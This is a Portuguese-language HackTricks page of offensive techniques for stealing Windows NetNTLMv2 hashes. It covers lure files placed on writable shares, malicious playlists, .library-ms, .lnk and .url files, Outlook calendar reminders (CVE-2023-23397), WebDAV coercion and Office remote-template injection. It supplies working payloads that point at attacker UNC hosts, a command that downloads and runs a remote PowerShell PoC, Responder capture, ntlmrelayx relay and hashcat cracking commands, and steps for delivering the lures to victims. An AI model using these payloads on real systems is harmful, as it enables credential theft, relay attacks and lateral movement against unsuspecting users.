# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Confira todas as ótimas ideias de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde o download de um arquivo do microsoft word online até as fontes de leak de ntlm: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se você consegue **escrever em um share que usuários ou scheduled jobs navegam no Explorer**, coloque arquivos cujos metadados apontem para o seu UNC (por exemplo, `\\ATTACKER\share`). Renderizar a pasta aciona **autenticação SMB implícita** e vaza um **NetNTLMv2** para o seu listener.

1. **Generate lures** (cobre SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Coloque-os no compartilhamento gravável** (qualquer pasta que a vítima abra):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Escute e quebre**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
O Windows pode atingir vários arquivos de uma vez; qualquer coisa que o Explorer previsualize (`BROWSE TO FOLDER`) não requer cliques.

### Playlists do Windows Media Player (.ASX/.WAX)

Se você conseguir fazer com que o alvo abra ou visualize uma playlist do Windows Media Player que você controla, você pode leak Net‑NTLMv2 apontando a entrada para um caminho UNC. O WMP tentará buscar a mídia referenciada via SMB e autenticará implicitamente.

Exemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Fluxo de coleta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms leak de NTLM (CVE-2025-24071/24055)

O Windows Explorer lida de forma insegura com arquivos .library-ms quando eles são abertos diretamente de dentro de um arquivo ZIP. Se a definição da biblioteca aponta para um caminho UNC remoto (por exemplo, \\attacker\share), simplesmente navegar/abrir o .library-ms dentro do ZIP faz com que o Explorer enumere o UNC e emita autenticação NTLM para o atacante. Isso gera um NetNTLMv2 que pode ser crackado offline ou potencialmente relayado.

.library-ms mínimo apontando para um UNC do atacante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Passos operacionais
- Crie o arquivo .library-ms com o XML acima (defina seu IP/hostname).
- Comprima-o (no Windows: Enviar para → Pasta compactada (zipada)) e entregue o ZIP ao alvo.
- Execute um listener de captura NTLM e aguarde a vítima abrir o .library-ms de dentro do ZIP.


### Caminho do som de lembrete do calendário do Outlook (CVE-2023-23397) – vazamento Net-NTLMv2 zero-click

O Microsoft Outlook para Windows processava a propriedade estendida do MAPI PidLidReminderFileParameter em itens de calendário. Se essa propriedade apontar para um caminho UNC (por exemplo, \\attacker\share\alert.wav), o Outlook contactaria o compartilhamento SMB quando o lembrete disparasse, vazando o Net-NTLMv2 do usuário sem nenhum clique. Isso foi corrigido em 14 de março de 2023, mas ainda é altamente relevante para ambientes legados/não tratados e para resposta histórica a incidentes.

Exploração rápida com PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado do listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- Uma vítima só precisa ter o Outlook for Windows em execução quando o lembrete dispara.
- O leak gera Net‑NTLMv2 adequado para cracking offline ou relay (não pass‑the‑hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer renderiza ícones de atalhos automaticamente. Pesquisas recentes mostraram que, mesmo após o patch de abril de 2025 da Microsoft para atalhos com ícone UNC, ainda era possível acionar autenticação NTLM sem cliques hospedando o destino do atalho em um caminho UNC e mantendo o ícone local (bypass do patch atribuído a CVE-2025-50154). Apenas visualizar a pasta faz o Explorer recuperar metadados do destino remoto, emitindo NTLM para o servidor SMB do atacante.

Payload mínimo de Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de atalho de programa (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Solte o atalho em um ZIP e faça a vítima navegar nele.
- Coloque o atalho em um share gravável que a vítima abrirá.
- Combine com outros lure files na mesma pasta para que o Explorer faça preview dos itens.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows carrega metadados de `.lnk` durante **view/preview** (renderização de ícone), não apenas na execução. CVE‑2026‑25185 mostra um caminho de parsing em que blocos **ExtraData** fazem o shell resolver um caminho de ícone e tocar o filesystem **durante o load**, emitindo NTLM outbound quando o caminho é remote.

Condições principais de trigger (observadas em `CShellLink::_LoadFromStream`):
- Inclua **DARWIN_PROPS** (`0xa0000006`) em ExtraData (gate para a rotina de update de ícone).
- Inclua **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) com **TargetUnicode** preenchido.
- O loader expande variáveis de ambiente em `TargetUnicode` e chama `PathFileExistsW` no caminho resultante.

Se `TargetUnicode` resolver para um caminho UNC (por exemplo, `\\attacker\share\icon.ico`), **apenas visualizar uma pasta** contendo o atalho causa authentication outbound. O mesmo caminho de load também pode ser acionado por **indexing** e **AV scanning**, tornando isso uma superfície prática de leak no‑click.

Ferramentas de pesquisa (parser/generator/UI) estão disponíveis no projeto **LnkMeMaybe** para construir/inspecionar essas estruturas sem usar a Windows GUI.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

O cliente nativo **WebDAV** pode ser abusado para forçar a sessão de logon atual a autenticar em um endpoint **HTTP/WebDAV** arbitrário:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Por que isso é útil:
- Contra um **servidor WebDAV controlado pelo atacante**, pode disparar **NTLM over HTTP** sem precisar dropar um client customizado.
- Contra **hosts internos**, é uma forma discreta de **validar onde credenciais roubadas são aceitas** antes de se mover lateralmente.
- O comando é uma boa alternativa quando **SMB egress está filtrado**, mas **HTTP/WebDAV** ainda é acessível.

Notas operacionais:
- O serviço **WebClient** deve estar em execução no host de origem.
- `rundll32.exe` carrega `davclnt.dll` e faz o Windows tratar a autenticação WebDAV usando as **credenciais do usuário atual**.
- Se você apontá-lo para uma infraestrutura que controla, use um listener/relay HTTP compatível com NTLM, como:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Do ponto de vista de detecção, execuções repetidas de `rundll32.exe davclnt.dll,DavSetCookie` contra muitos sistemas internos são um forte sinal de **validação de credenciais / preparação de movimento lateral semelhante a spray** em vez de comportamento normal do usuário.

### Injeção de template remoto do Office (.docx/.dotm) para coagir NTLM

Documentos do Office podem referenciar um template externo. Se você definir o template anexado para um caminho UNC, ao abrir o documento ele autenticará via SMB.

Alterações mínimas de relacionamento do DOCX (dentro de word/):

1) Edite word/settings.xml e adicione a referência ao template anexado:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edite word/_rels/settings.xml.rels e aponte rId1337 para seu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempacote para .docx e entregue. Execute seu listener de captura SMB e aguarde a abertura.

Para ideias pós-captura sobre relay ou abuso de NTLM, confira:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE-2025-24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
